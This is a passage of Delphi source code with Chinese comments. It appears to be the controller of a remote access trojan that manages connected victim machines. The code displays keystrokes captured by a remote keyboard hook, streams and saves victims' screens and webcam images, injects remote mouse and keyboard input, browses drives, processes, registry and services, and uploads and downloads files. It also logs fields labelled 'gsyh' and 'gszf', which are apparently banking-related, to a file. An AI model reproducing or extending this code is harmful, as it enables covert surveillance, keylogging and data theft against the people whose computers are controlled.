  tmpstr:=FileInfo.szDisplayName;
  tmpstr:=FileInfo.szTypeName;
  //FileInfo.
  //self.Caption:=FileInfo.szTypeName;
end;
procedure tfmain.ProcessGetFileInfos(FileInfos:pointer;size:integer);
label 1;
var
  Files:array of win32_find_dataA;
  filename:pansiChar;
  count,i:integer;
  node:ttreenode;
  item:tListitem;
  localFileTime:tFileTime;
  sysTime:tSystemTime;
begin
  if size=0 then goto 1;
  count:=size div sizeof(win32_find_dataA);
  setlength(Files,count);
  copymemory(Files,FileInfos,size);
  node:=treedir.Selected;
  node.DeleteChildren;
  listFiles.Clear;
  for i:=0 to count-1 do
  begin
    fileName:=Files[i].cFileName;
    if (fileName[0]='.') and (i<2) then continue;
    if Files[i].dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY=FILE_ATTRIBUTE_DIRECTORY then
    begin
      node:=treeDir.Items.AddChild(treeDir.Selected,fileName);
      node.ImageIndex:=6;
      node.SelectedIndex:=7;
      node.StateIndex:=6;
    end//目录
    else begin
      item:=listFiles.Items.Add;
      item.Caption:=fileName;
      item.ImageIndex:=getFileiconIndex(fileName,false);
      item.SubItems.Add(sysutils.inttostr(Files[i].nFileSizeLow));
      item.SubItems.Add(FileTimeToStr(Files[i].ftCreationTime));
      item.SubItems.Add(FileTimeToStr(Files[i].ftLastWriteTime));
    end; //file
  end;//for
  node:=treeDir.Selected;
  Node.AlphaSort;
1:
  Screen. Cursor := crDefault;
  bar1.Panels[2].Text:='文件数：'+sysutils.inttostr(listFiles.Items.count)+'.';
end;
function tfmain.getListFile(node:ttreenode;item:tlistItem):string;
var
  treeDir,fName:string;
begin
  treeDir:=getTreeDir(node);
  fName:=item.Caption;
  fName:=treeDir+'\'+fName;
  result:=fName;
end;
function tfmain.GetTreeDir(node:ttreenode):string;
var
  parentNode:ttreenode;
  path:string;
begin
  parentNode:=node;
  path:=node.text;
  while parentnode.parent<>nil do
  begin
    path:=parentnode.Parent.Text+'\'+path;
    ParentNode:=parentnode.Parent;
  end;
  delete(path,1,pos('\',path));
  result:=path;
end;
procedure tfmain.ShowPCInfo(item:tlistitem);
//06-05-13:显示PC信息
var
  i,j:integer;
  s,r:ansistring;
  ss,st:tstrings;
begin
  ss:=item.SubItems;
  //if ss.Count<>35 then exit;
  st:=tstringlist.Create;
  for i:=7 to ss.Count-1 do
  begin
    r:=copy(ss[i],1,pos('>',ss[i]));
    if(length(r)<length(ss[i])) then
    begin
      if length(ss[i])-(2*length(r)+1)>0 then
        s:=copy(ss[i],length(r)+1,length(ss[i])-(2*length(r)+1))
      else
        s:='';
    end;//if(length(r)<length(ss[i])) then
    if r='<name>'         then r:='被控端名称：          ';
    if r='<version>'      then r:='版本：                ';
    if r='<OSVersion>'    then r:='操作系统：            ';
    if r='<LocalIP>'      then r:='本机地址：            ';
    if r='<ComputerName>' then r:='计算机名称：          ';
    if r='<Workgroup>'    then r:='工作组：              ';
    if r='<UserName>'     then r:='登陆用户：            ';
    if r='<IEVersion>'    then r:='浏览器版本：          ';
    if r='<DXVersion>'    then r:='DX版本：              ';
    if r='<CPUSpeed>'     then r:='CPU速度：             ';
    if r='<Phymemery>'    then r:='物理内存：            ';
    if r='<ScrSize>'      then r:='显示分辨率：          ';
    if r='<OpenTime>'     then r:='开机时间：            ';
    if r='<SetupTime>'    then r:='安装时间：            ';
    if r='<SvcName>'      then r:='服务名称：            ';
    if r='<FileName>'     then r:='文件名：              ';
if r='<IsRemoteDeskConn>' then r:='远程桌面连接：        ';
    if r='<gsyh>'         then r:='gsyh：                ';
    if r='<gszf>'         then r:='gszf：                ';
    if r='<RemoteIP>'     then r:='远程IP：              ';
    if r='<RemoteAddr>'   then r:='远程地址：            ';
    if (r<>'')and(r[1]<>'<') then
    begin
      if (r='登陆用户：            ')and(length(s)>0)and(lowercase(s)<>'system') then
      begin
        if pos(ansiChar(ord('-')+1),s)>0 then
        for j:=1 to length(s) do s[j]:=ansiChar(ord(s[j])-1);
      end;
      st.Add(r+s);
    end;
  end;//for i:=7 to ss.Count-1 do
  memoPCInfo.Text:=st.Text;
  st.Free;
end;
procedure tfmain.ProcessGetPCInfo(Socket:TCustomWinSocket);
//06-05-13:处理XML格式的客户端信息
var
  pc:pconn;
  ss:tstrings;
  s,r:string;
  i:integer;
  node:ttreeNode;
  item:tlistitem;
begin
//try
  pc:=Socket.Data;
  ss:=tstringlist.Create;ss.Text:=string(pc^.data);
  s:='<RemoteIP>'+Socket.RemoteAddress+'</RemoteIP>';
  ss.Insert(ss.Count-1,s);
  s:='<RemoteAddr>'+GetIPAddr(Socket.RemoteAddress)+'</RemoteAddr>';
  ss.Insert(ss.Count-1,s);
  for i:=0 to ss.Count-1 do
  begin
    //application.ProcessMessages;
    r:=copy(ss[i],1,pos('>',ss[i]));
    if(length(r)<length(ss[i])) then
    begin
      if length(ss[i])-(2*length(r)+1)>0 then
        s:=copy(ss[i],length(r)+1,length(ss[i])-(2*length(r)+1))
      else
        s:='';
    end;
    if r='<PCInfo>' then
    begin
      //node:=AddConToTree(Socket);
      node:=TreeClient.Selected;
      item:=AddConToList(Socket);
      bar1.Panels[1].Text:='当前连接数：'+sysutils.inttostr(treeClient.Items.Count)+'。';
      continue;
    end;//if pos('<>',ss[i])=1 then
    if r='<name>' then
    begin
      if s<>'' then
      begin
        node.Text:=s;
        item.Caption:=s;
      end;
      continue;
    end;//if pos('<>',ss[i])=1 then
    if r='<video>' then
    begin
      if s='true' then
      begin
        item.ImageIndex:=9;
        item.StateIndex:=9;
        node.ImageIndex:=9;
        node.StateIndex:=9;
        node.SelectedIndex:=9;
      end;
      continue;
    end;//
    if r='<version>' then
    begin
      item.SubItems[0]:=s;
      continue;
    end;//if pos('<>',ss[i])=1 then
    if r='<OSVersion>' then
    begin
      item.SubItems[1]:=s;
      continue;
    end;//if pos('<>',ss[i])=1 then
    if r='<ComputerName>' then
    begin
      item.SubItems[2]:=s;
      continue;
    end;//if pos('<>',ss[i])=1 then
    if r='<gsyh>' then
    begin
      item.SubItems[3]:=s;
      if (s<>'')and(s<>'used') then
      begin
        r:=SysUtils.ExtractFilePath(Application.ExeName)+'server.txt';
        func.Log(pansiChar(ss.text),pansiChar(r));
      end;
      continue;
    end;//if pos('<>',ss[i])=1 then
    if r='<gszf>' then
    begin
      item.SubItems[4]:=s;
      if (s<>'')and(s<>'used') then
      begin
        r:=SysUtils.ExtractFilePath(Application.ExeName)+'server.txt';
        //Log(pansiChar(ss.text),pansiChar(r));
      end;
      continue;
    end;//if pos('<>',ss[i])=1 then
    if r='<RemoteIP>' then
    begin
      item.SubItems[5]:=s;
      continue;
    end;//if pos('<>',ss[i])=1 then
    if r='<RemoteAddr>' then
    begin
      item.SubItems[6]:=s;
      continue;
    end;//if pos('<>',ss[i])=1 then
    if r='</PCInfo>' then
    begin
      item.SubItems.AddStrings(ss);
      continue;
    end;//if pos('<>',ss[i])=1 then
  end;//for
//except
  //showmessage(ss.text);
  ss.Free;
//end;
end;
procedure tfmain.ProcessGetDrvs(Drvs:pointer;size:integer);
var
  i,count:integer;
  node:ttreenode;
  s:string;
  ds:tDriveInfos;
begin
  treeDir.Items.Clear;
  node:=treeDir.Items.Add(nil,treeClient.Selected.Text);
  node.ImageIndex:=0;
  node.SelectedIndex:=0;
  node.StateIndex:=0;
  count:=size div sizeof(stDriveInfo);
  setlength(ds,count);
  copymemory(ds,drvs,size);
  for i:=0 to count-1 do
  begin
    s:=ds[i].name;
    node:=treeDir.Items.AddChild(treeDir.items[0],s);
    case ds[i].t of
    DRIVE_UNKNOWN:
      begin
      end;
    DRIVE_NO_ROOT_DIR:
      begin
      end;
    DRIVE_REMOVABLE:
      begin
        if upcase(ds[i].name[0])='A' then
        begin
          node.ImageIndex:=1;
          node.SelectedIndex:=1;
          node.StateIndex:=1;
        end
        else begin
          node.ImageIndex:=4;
          node.SelectedIndex:=4;
          node.StateIndex:=4;
        end;//
      end;//DRIVE_REMOVABLE:
    DRIVE_FIXED:
      begin
          node.ImageIndex:=2;
          node.SelectedIndex:=2;
          node.StateIndex:=2;
      end;//DRIVE_FIXED
    DRIVE_REMOTE:
      begin
          node.ImageIndex:=5;
          node.SelectedIndex:=5;
          node.StateIndex:=5;
      end;//DRIVE_REMOTE:
    DRIVE_CDROM:
      begin
          node.ImageIndex:=3;
          node.SelectedIndex:=3;
          node.StateIndex:=3;
      end;// DRIVE_CDROM
    DRIVE_RAMDISK:
      begin
          node.ImageIndex:=1;
          node.SelectedIndex:=1;
          node.StateIndex:=1;
      end;//DRIVE_RAMDISK
    end;//case
  end;//for
  treeDir.FullExpand;
end;
procedure tfmain.SetImageLists(list:tlistview);
var
FileInfo:TSHFileInfo;
begin
  //向ListView传递系统的ImageList
  with List do
  begin

  if not Assigned(SmallImages) then
  begin
    SmallImages := TImageList.Create(nil);
    SmallImages.ShareImages := True;
    SmallImages.Handle := SHGetFileInfo('c:\',
      0,
      FileInfo,
      SizeOf(FileInfo),
      SHGFI_SMALLICON or SHGFI_SYSICONINDEX or SHGFI_TYPENAME or SHGFI_USEFILEATTRIBUTES);
  end;
  if not Assigned(LargeImages) then
  begin
    LargeImages := TImageList.Create(nil);
    LargeImages.ShareImages := True;
    LargeImages.Handle := SHGetFileInfo('c:\',
      0,
      FileInfo,
      SizeOf(FileInfo),
      SHGFI_LARGEICON or SHGFI_SYSICONINDEX or SHGFI_TYPENAME or SHGFI_USEFILEATTRIBUTES);
  end;

  end;
end;
procedure tFMain.TransDataMsg(var aMessage:Tmessage);
var
  p:pointer;
  ThreadType:TThreadType;
  //pRun:pRunAPIInfo;
  pMT:pMainTread;
  pLS:pListenSocket;
  pT:pTypeCS;
  pTF:pTransFilesCS;
  pTS:pTransScrCS;
  pTR:pTransferCS;
  pAct:pBool;
  tID:cardinal;
  pRD:pRecvDataCS;
  dir:string;
  pc:pconn;
begin
  p:=pointer(aMessage.LParam);
  threadType:=TThreadType(p^);
  pAct:=pBool(pansiChar(p)+sizeof(TThreadType));
  case threadType of
  FMainThread:
    begin
      pMT:=p;
      if pMT^.order=FStart then
      begin
        pDatas:=tlist.Create;
        pDatas.Add(pMT);
        new(pLS);
        pLS^.thread.threadType:=FListenSocket;
        pLS^.thread.active:=true;
        pLS^.sendMsg.hform:=FMain.Handle;
        pLS^.sendMsg.msgType:=wm_TransData;
        pLS^.thread.hThread:=createthread(nil,0,@TransDataThread,pLS,0,tID);
        pLS^.thread.threadID:=tID;
      end;//if pMT^.order=FStart then
      if pMT^.order=Fclose then
      begin
        //for i:=0 to pDatas.co
      end;//if pMT^.order=FStart then
    end;//FMainThread
  FTransferMain:
    begin
      pMT:=p;
      if pMT^.order=FStart then
      begin
        if not assigned(pDatas) then
          pDatas:=tlist.Create;
        pDatas.Add(pMT);
        new(pLS);
        pLS^.thread.threadType:=FListenSocket;
        pLS^.thread.active:=true;
        pLS^.sendMsg.hform:=FMain.Handle;
        pLS^.sendMsg.msgType:=wm_TransData;
        pLS^.thread.hThread:=createthread(nil,0,@TransferThread,pLS,0,tID);
        pLS^.thread.threadID:=tID;
      end;//if pMT^.order=FStart then
      if pMT^.order=Fclose then
      begin
        //for i:=0 to pDatas.co
      end;//if pMT^.order=FStart then
    end;//FMainThread
  FTransfer:
    begin
      pTR:=p;
      if pTR^.runAPI.aAPI=FthreadStart then pDatas.Add(p);
      memoOut.Lines.Add(pTR^.runAPI.Info);
    end;
  FListenSocket:
    begin
      pLS:=p;
      if pLS^.runAPI.aAPI=FthreadStart then pDatas.Add(p);
      memoOut.Lines.Add(pLS^.runAPI.Info);
    end;//FLisenSocket
  FTypeClient:
    begin
      pT:=p;
      if pT^.runAPI.aAPI=FthreadStart then pDatas.Add(p);
      memoOut.Lines.Add(pT^.runAPI.Info);
    end;//FTypeClient
  FTransScr:
    begin
      pTS:=p;
      if (aMessage.wParam=88) then
      begin
        //imgScreen.Picture.Bitmap.Handle:=pTS^.hBmp;
        if menuFloatPic.Checked then
        begin
          if not fscr.Visible then fscr.Show;
          fscr.imgScreen.Picture.Bitmap.LoadFromStream(pTS^.stream);
          fscr.imgScreen.Update;
          if menuSavePic.Checked then
          begin
            dir:='c:\screen\'+treeClient.Selected.Text;
            if not directoryexists(dir) then forcedirectories(dir);
            fscr.imgScreen.Picture.Bitmap.SaveToFile(dir+'\'+UniqueStrFromTime+'.bmp');
          end; //if menuSavePic.Checked then
        end
        else begin
          imgScreen.Picture.Bitmap.LoadFromStream(pTS^.stream);
          imgScreen.Update;
          if menuSavePic.Checked then
          begin
            dir:='c:\screen\'+treeClient.Selected.Text;
            if not directoryexists(dir) then forcedirectories(dir);
            imgScreen.Picture.Bitmap.SaveToFile(dir+'\'+UniqueStrFromTime+'.bmp');
          end; //if menuSavePic.Checked then
        end;
        if bSingleScr then dm.SetScr(FScrClose);
        exit;
      end;
      if (aMessage.wParam=66) then
      begin
        if not fvideo.Visible then fvideo.Show;
        fvideo.imgVideo.Picture.Bitmap.LoadFromStream(pTS^.stream);
        fvideo.imgVideo.Update;
        if bSingleScr then dm.SetScr(FScrClose);
        if menuSavePic.Checked then
        begin
          dir:='c:\screen\'+treeClient.Selected.Text;
          if not directoryexists(dir) then forcedirectories(dir);
          fvideo.imgVideo.Picture.Bitmap.SaveToFile(dir+'\'+UniqueStrFromTime+'.bmp');
        end;
        sleep(0);
        exit;
      end;
      if pTS^.runAPI.aAPI=FthreadStart then pDatas.Add(p);
      memoOut.Lines.Add(pTS^.runAPI.Info);
    end;//FTransScr
  FTransFile:
    begin
      pTF:=p;
      if pTF^.runAPI.aAPI=FthreadStart then pDatas.Add(p);
      memoOut.Lines.Add(pTF^.runAPI.Info);
      bar1.Panels[2].Text:=pTF^.runAPI.Info;
    end;//FTransFile
  FRecvData:
    begin
      pRD:=p;
      if pRD^.runAPI.aAPI=FthreadStart then pDatas.Add(p);
      memoOut.Lines.Add(pRD^.runAPI.Info);
      bar1.Panels[2].Text:=pRD^.runAPI.Info;
      if (aMessage.wParam=1) then
      begin
        case pRD^.oh.order of
        o_PCInfo:
          begin
            GetPCInfoConn:=GetPCInfoConn+1;
            CurPC^.data:=pRD^.oh.data;
            CurPC^.size:=pRD^.oh.DataSize;
            CurSocket.Data:=CurPC;
            SendMessage(hForm,wm_Conn,integer(GetPCInfo),integer(CurSocket));
          end;//o_PCInfo
        o_ListDrvs:
          begin
            CurPC.data:=pRD^.oh.data;
            CurPC.size:=pRD^.oh.DataSize;
            SendMessage(hForm,wm_Conn,integer(GetDrvs),integer(CurSocket));
          end;//o_ListDrvs
        o_ListFileInfos:
          begin
            CurPC.data:=pRD^.oh.data;
            CurPC.size:=pRD^.oh.DataSize;
            SendMessage(hForm,wm_Conn,integer(GetFileInfos),integer(CurSocket));
          end;//GetFileInfos
        o_ListProcs:
          begin
            CurPC.data:=pRD^.oh.data;
            CurPC.size:=pRD^.oh.DataSize;
            SendMessage(hForm,wm_Conn,integer(GetProcs),integer(CurSocket));
          end;//GetFileInfos
         o_Reg:
          begin
            CurPC.data:=pRD^.oh.data;
            CurPC.size:=pRD^.oh.DataSize;
            SendMessage(hForm,wm_Conn,integer(GetRegInfo),integer(CurSocket));
          end;//o_ListProcs
         o_GetPCName:
          begin
            CurPC.data:=pRD^.oh.data;
            CurPC.size:=pRD^.oh.DataSize;
            SendMessage(hForm,wm_Conn,integer(GetPCName),integer(CurSocket));
          end;//o_GetPCName
         o_opHookKey:
          begin
            CurPC.data:=pRD^.oh.data;
            CurPC.size:=pRD^.oh.DataSize;
            SendMessage(hForm,wm_Conn,integer(GetHookKeys),integer(CurSocket));
          end;//o_GetPCName
         o_Svc:
          begin
            CurPC.data:=pRD^.oh.data;
            CurPC.size:=pRD^.oh.DataSize;
            SendMessage(hForm,wm_Conn,integer(GetSvcInfo),integer(CurSocket));
          end;//o_GetPCName
        end;//case pRD^.oh.order of
      end;//if (aMessage.wParam=1) then                Recv data;
    end;//FRcvData
  end;// case
  if pAct^=false then
  begin
    pDatas.Delete(pDatas.IndexOf(p));
  end;
  sleep(0);
end;
procedure tfmain.ShowSocketErr(ErrorEvent: TErrorEvent);
begin
if ErrorEvent=eeConnect then
  begin
    fmain.bar1.Panels[0].Text:='连接失败！';
  end;
  if ErrorEvent=eeGeneral then
  begin
    fmain.bar1.Panels[0].Text:='无法识别的错误！';
  end;
  if ErrorEvent=eeSend then
  begin
    fmain.bar1.Panels[0].Text:='发送数据失败！';
  end;
    if ErrorEvent=eeReceive then
  begin
    fmain.bar1.Panels[0].Text:='接受数据失败！';
  end;
    if ErrorEvent=eeDisconnect then
  begin
    //DisCon(socket);

    fmain.bar1.Panels[0].Text:='关闭连接失败！';
  end;
    if ErrorEvent=eeAccept then
  begin
    fmain.bar1.Panels[0].Text:='接受连接失败！';
  end;
end;
function tfMain.AddConToTree(Socket: TCustomWinSocket):ttreenode;
var
  pc:pConn;
begin
  result:=nil;
  result:=fmain.treeClient.Items.add(result,socket.RemoteAddress);
  result.ImageIndex:=8;
  result.SelectedIndex:=8;
  result.StateIndex:=8;
  result.Data:=Socket;
  pc:=socket.Data;
  pc^.node:=result;
end;
function tfmain.AddConToList(Socket: TCustomWinSocket): TListItem;
var
  pc:pConn;
begin
  result:=nil;
  result:=fmain.ListPCInfo.Items.add();
  result.Caption:=Socket.RemoteAddress;
  result.SubItems.Add('');
  result.SubItems.Add('');
  result.SubItems.Add('');
  result.SubItems.Add('');
  result.SubItems.Add('');
  result.SubItems.Add('');
  result.SubItems.Add('');
  //result.SubItems.Add('');
  result.ImageIndex:=8;
  result.StateIndex:=8;
  result.Data:=Socket;
  pc:=socket.Data;
  pc^.item:=result;
  listpcinfo.Update;
end;
procedure TfMain.OnConn(var msg:Tmessage);
var
  flg:tflg;
  Socket:TCustomWinSocket;
  pf:pIPServer;
  pc:pconn;
  node:ttreenode;
  item:tlistitem;
  ErrorEvent: TErrorEvent;
begin
  bTree1Change:=false;
  flg:=tflg(msg.wParam);
  if flg=setIPServerInfo then
    pf:=pIPServer(msg.LParam)
  else begin
    Socket:=TCustomWinSocket(msg.lparam);
    pc:=socket.data;
  end;
  case flg of
  SMConn:
    begin

      AddConToTree(TCustomWinSocket(msg.lparam));
      ShowIPAddr(Socket.RemoteAddress);
      //pc^.flg:=GetPCName;
      //dm.SendOrder(socket,o_GetPCName);
      bar1.Panels[1].Text:='当前连接数：'+sysutils.inttostr(treeClient.Items.Count)+'。';

    end;//smconn
  SMDisConn:
    begin
      node:=pc^.node;
      item:=pc^.item;
      if node<>nil then
      if node=TreeClient.Selected then
      begin
        CurSocket:=nil;
        CurPc:=nil;
        //fmain.Tree1.Items[0].Selected:=true;
        //fmain.tree1.FullExpand;
        fmain.Bar1.Panels[0].Text:='当前连接已经断开！';
      end;
      if node<>nil then
      treeClient.Items.Delete(node);
      if item<>nil then
      item.Delete;
      //pc^.ss.Free;
      dispose(pc);
      bar1.Panels[1].Text:='当前连接数：'+sysutils.inttostr(treeClient.Items.Count)+'。';
    end;//smDisConn
  SMErr:
    begin
      ShowSocketErr(TerrorEvent(msg.LParam));
    end;
  GetPCInfo:
    begin
      ProcessGetPCInfo(Socket);
      {
      memoPCInfo.Clear;
      memoPCInfo.lines.add(pansiChar(pc^.data));
      ShowIPAddr(Socket.RemoteAddress);
      }
    end;//GetPCInfo:
  GetDrvs:
    begin
      ProcessGetDrvs(pc^.data,pc^.size);
    end;//GetDrvs
  GetFileInfos:
    begin
      ProcessGetFileInfos(pc^.data,pc^.size);
    end;//
  GetProcs:
    begin
      ProcessGetProcs(pc^.data,pc^.size);
    end;//GetProcs
  GetRegInfo:
    begin
      ProcessGetRegInfo(pc^.data,pc^.size);
    end;//GetRegInfo
  GetPCName:
    begin
      ProcessGetPCName(pc^.data,pc^.Node);
    end;//GetPCName
  GetHookKeys:
    begin
      memoKeys.Text:=pansiChar(pc^.data);
    end;//GetHookKeys
  GetSvcInfo:
    begin
      ProcessGetSvcInfo(pc^.data,pc^.size);
    end;//GetRegInfo
  setIPServerInfo:
    begin
      if pf^.svr.port=1 then
      begin
        memoPCInfo.Lines.Add('设置'+pf^.mysvr.svr.IP+'到'+pf^.svr.DN+pf^.aFile+'成功！');  
      end
      else begin
        memoPCInfo.Lines.Add('设置'+pf^.mysvr.svr.IP+'到'+pf^.svr.DN+pf^.aFile+'失败！');  
      end;
    end;//
  end;//case
  bTree1Change:=true;
end;
function TfMain.CurConActive:boolean;
var
  socket:TCustomWinSocket;
  pc:pconn;
begin
  result:=false;
  if (treeClient.Items.Count<1) then
  begin
    showmessage('无当前连接！');
    bar1.Panels[0].Text:='无当前连接！';
    exit;
  end;
  if (treeClient.SelectionCount=0)  then
  begin
    showmessage('请选择连接！');
    bar1.Panels[0].Text:='请选择连接！';
    exit;
  end;
  if (CurSocket=nil) or (CurPC=nil) then exit;
  {
  if CurPC^.flg<>ready then
  begin
    showmessage('系统忙！');
    bar1.Panels[0].Text:='系统忙！！';
    exit;
  end;
  }
  result:=true;
end;
//2015.5.26
{
function TfMain.SetCurConActive:boolean;  //2015.5.26重置为等待状态
var
  socket:TCustomWinSocket;
  pc:pconn;
begin
  result:=false;
  if (treeClient.Items.Count<1) then
  begin
    showmessage('无当前连接！');
    bar1.Panels[0].Text:='无当前连接！';
    exit;
  end;
  if (treeClient.SelectionCount=0)  then
  begin
    showmessage('请选择连接！');
    bar1.Panels[0].Text:='请选择连接！';
    exit;
  end;
  if (CurSocket=nil) or (CurPC=nil) then exit;
  if CurPC^.flg<>ready then
  begin
    CurPC^.flg:=ready;
    showmessage('已重置为准备状态！');
    bar1.Panels[0].Text:='已重置为准备状态！！';
  end;
  result:=true;
end;
}
procedure TFMain.FormShow(Sender: TObject);
var
  pData:pMainTread;
  buf:array[0..31] of ansiChar;
  nSize:cardinal;
begin
  new(pData);
  
  pData^.threadType:=FMainThread;
  pData^.order:=FStart;
  sendmessage(Fmain.Handle,wm_transData,0,integer(pData));

  pData^.threadType:=FTransferMain;
  pData^.order:=FStart;
  sendmessage(Fmain.Handle,wm_transData,0,integer(pData));

  page1.ActivePageIndex:=0;
  data.hForm:=fmain.handle;
  SetImageLists(ListFiles);
  SetImageLists(ListSvc);
  dm.bQuery:=menuQComs.Checked;
  ShowIPAddr('');
  //FilterIP:=GetFilterIP('');
  //memoPCInfo.Lines.Add('当前过滤IP：');
  //memoPCInfo.Lines.Add(FilterIP);

  //nSize:=sizeof(buf);
  //GetComputerName(@Buf[0],nSize);
  //if(stricomp(buf,'BYC')=0)or(stricomp(buf,'GZL')=0) then
  //SetIPToServer();//IP登记 06-08-13屏蔽
  fmain.Caption:=myname+myversion;

  {
  //更新前一版本
  ips:=tstringlist.Create;
  ipFile:=sysutils.ExtractFilePath(application.ExeName)+'ip.txt';
  if not sysutils.FileExists(ipFile) then
  begin
    ips.Add('ip');
    ips.SaveToFile(ipFile);
  end;
  ips.LoadFromFile(ipFile);
  }
  if not menuQuickConn.Checked then
    dm.SendPCInfoOrder;
end;

procedure TFMain.TreeClientChange(Sender: TObject; Node: TTreeNode);
var
  ViewMode:byte;

begin
  if not bTree1Change then exit;
  if TreeClient.Selected=nil then exit;
  dm.SetScr(FScrClose);
  CurSocket:=TcustomWinSocket(treeClient.Selected.Data);
  CurPC:=CurSocket.data;
  if menuScrSeries.Checked then
  begin
    menuScrStartClick(self);
  end;
  dm.SendOrder(o_PCInfo);
  //06-05-13:
  //CurPC^.flg:=GetDrvs;

  dm.SendOrder(o_ListDrvs);
  //ShowPCInfo(CurPC^.item);
  //CurPC^.item.Selected:=true;
end;

procedure TFMain.SpeedButton10Click(Sender: TObject);
begin
  close;
end;



procedure TFMain.imgScreenMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  //MM:TMouseMsg;
  mi:TMouseInput;
  inp:TInput;
  oh:stOrdHeader;
begin
  if CurSocket=nil then exit;
  mi.dx:=X;
  mi.dy:=Y;
  mi.mouseData:=0;
  mi.time:=0;
  mi.dwExtraInfo:=0;
  case Button of
   mbLeft:mi.dwFlags:=MOUSEEVENTF_LEFTDOWN;
   mbRight:mi.dwFlags:=MOUSEEVENTF_RIGHTDOWN;
   mbMiddle:mi.dwFlags:=MOUSEEVENTF_MIDDLEDOWN;
  end;//case
  inp.Itype:=INPUT_MOUSE;
  inp.mi:=mi;
  dm.SendOrder(o_KeyMouse,@inp,sizeof(inp));

end;

procedure TFMain.imgScreenMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  mi:TMouseInput;
  inp:TInput;

begin
  if CurSocket=nil then exit;
  mi.dx:=X;
  mi.dy:=Y;
  mi.mouseData:=0;
  mi.time:=0;
  mi.dwExtraInfo:=0;
  case Button of
   mbLeft:mi.dwFlags:=MOUSEEVENTF_LEFTUP;
   mbRight:mi.dwFlags:=MOUSEEVENTF_RIGHTUP;
   mbMiddle:mi.dwFlags:=MOUSEEVENTF_MIDDLEUP;
  end;//case
  inp.Itype:=INPUT_MOUSE;
  inp.mi:=mi;

  dm.SendOrder(o_KeyMouse);
  CurSocket.SendBuf(inp,sizeof(inp));
end;

procedure TFMain.edtVtKeyKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  inp:TInPut;
  ki:TKeybdInput;
begin
  if CurSocket=nil then exit;
  ki.wVk:=Key;
  ki.wScan:=0;
  ki.time:=0;
  ki.dwExtraInfo:=0;
  ki.dwFlags:=KEYEVENTF_EXTENDEDKEY;
  inp.Itype:=INPUT_KEYBOARD;
  inp.ki:=ki;
  dm.SendOrder(o_KeyMouse);
  CurSocket.SendBuf(inp,sizeof(inp));
end;
procedure tfmain.menuScrStartClick(Sender: TObject);
var
  viewMode:byte;
begin
  if not CurConActive then exit;//当前连接是否可用，是否空闲
  if(menuColor1.Checked) then ViewMode:=vmColor2;
  if(menuColor4.Checked) then ViewMode:=vmColor4;
  if(menuColor8.Checked) then ViewMode:=vmColor8;
  if(menuColor16.Checked) then ViewMode:=vmColor16;
  if(menuColor24.Checked) then ViewMode:=vmColor24;
  if menuScr.Checked then
  begin
  dm.SendOrder(o_Screen);
  dm.SendBuf(CurSocket,@ViewMode,sizeof(ViewMode));
  end;
  if menuVideo.Checked then
  begin
   ViewMode:=0;
   dm.SendOrder(o_Screen);
   dm.SendBuf(CurSocket,@ViewMode,sizeof(ViewMode));
  end;
  bSingleScr:=false;
end;
procedure tfmain.menuScrPauseClick(Sender: TObject);
begin
  dm.SetScr(FScrPause);
end;
procedure tfmain.menuScrContinueClick(Sender: TObject);
begin
  dm.SetScr(FScrContinue);
end;
procedure tfmain.menuScrCloseClick(Sender: TObject);
begin
 dm.SetScr(FScrClose);
end;
procedure TFMain.FormCreate(Sender: TObject);
begin
  DoubleBuffered:=True;
end;
procedure tfmain.FormDestroy(Sender: TObject);
begin
  //new(pData);
  //pData^.threadType:=FMainThread;
  //pData^.order:=FStart;
  //sendmessage(Fmain.Handle,wm_transData,0,integer(pData));
end;
procedure TFMain.popDisConClick(Sender: TObject);
begin
  if (treeClient.SelectionCount>0)and(CurSocket<>nil) then
  begin
    dm.SetScr(FScrClose);
    CurSocket.Close;
  end;
end;

procedure TFMain.TreeDirChange(Sender: TObject; Node: TTreeNode);
var
  path:ansistring;
  size:dword;
  iRet:integer;
begin
  //Screen.Cursor :=crHourglass;
  if treeDir.Items[0].Selected then exit;
  if not CurConActive  then exit;//当前连接是否可用，是否空闲
  path:=GetTreeDir(TreeDir.Selected);
  size:=length(path);
  dm.SendOrder(o_ListFileInfos,pansiChar(path),size);
  //Log(pansiChar(path));
  //dm.SendOrder(o_ListFileInfos);


  //iRet:=dm.SendBuf(@size,sizeof(size));
  //Log('ListDir Size:%d,Send Size:%d:',[size,iRet]);
  //iRet:=dm.SendBuf(pansiChar(path),size);
  //Log('ListDir SendBuf Size:%d:',[iRet]);

  CurPc^.flg:=GetFileInfos;
end;

procedure TFMain.popUpFileClick(Sender: TObject);
var
  LocalName,remoteName,LocalDir:ansistring;
  fi:stTransFilesInfo;
begin
  if not CurConActive then exit;
  if treeDir.SelectionCount=0 then
  begin
    bar1.Panels[0].Text:='请选择目录！';
    exit;
  end;
  if open1.Execute then
  begin
    LocalName:=open1.FileName;
    LocalDir:=sysutils.extractfiledir(LocalName);
    open1.InitialDir:=LocalDir;
    remoteName:=getTreeDir(treeDir.Selected)+'\'+sysutils.extractfilename(LocalName);
    zeromemory(@fi,sizeof(fi));

    strcopy(fi.server.IP,'');
    fi.server.flg:=0;
    fi.server.port:=PORT;
    strcopy(fi.clientFile,pansiChar(remoteName));
    strcopy(fi.serverFile,pansiChar(LocalName));
    fi.bUpLoad:=false;
    fi.bFolder:=false;
    fi.bCompleteDel:=false;
    //dm.SendOrder(o_TransFiles);
    //dm.SendBuf(@fi,sizeof(fi));
    dm.SendOrder(o_TransFiles,@fi,sizeof(fi));
  end;
end;

procedure TFMain.PopDownFileClick(Sender: TObject);
var
  LocalName,remoteName,LocalDir:ansistring;
  fi:stTransFilesInfo;
begin
  if not CurConActive then exit;
  remoteName:=getListFile(treeDir.Selected,ListFiles.Selected);
  save1.FileName:=sysutils.extractfilename(remotename);
  if save1.Execute then
  begin
    LocalName:=save1.FileName;
    LocalDir:=sysutils.extractfiledir(LocalName);
    save1.InitialDir:=LocalDir;

    zeromemory(@fi,sizeof(fi));
    fi.server.IP:='';fi.server.flg:=0;fi.server.port:=PORT;
    strcopy(fi.clientFile,pansiChar(remoteName));
    strcopy(fi.serverFile,pansiChar(LocalName));
    fi.bUpLoad:=true;
    fi.bFolder:=false;
    fi.bCompleteDel:=false;
    dm.SendOrder(o_TransFiles,@fi,sizeof(fi));
    //dm.SendBuf(@fi,sizeof(fi));
  end;

end;

procedure TFMain.PopUpLoadDirClick(Sender: TObject);
var
